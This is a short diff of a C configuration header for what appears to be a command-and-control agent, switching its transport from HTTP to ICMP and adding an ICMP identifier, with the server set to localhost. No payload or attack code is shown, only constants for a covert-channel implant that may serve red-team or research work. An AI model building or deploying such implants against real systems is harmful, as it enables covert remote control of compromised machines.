@@ -6,10 +6,12 @@
 #define TRANSPORT_ICMP 2
 #define TRANSPORT_DNS 3
 
-#define TRANSPORT TRANSPORT_HTTP //config data
+#define TRANSPORT TRANSPORT_ICMP //config data
 #define SERVER_IP "127.0.0.1" //config data
 #define SERVER_PORT 8080 //config data
 #define AGENT_ID "agent_999" //config data
+#define ICMP_ID 0x666
+                             //
 #define SLEEP_INTERVAL 5 //config data
 
 
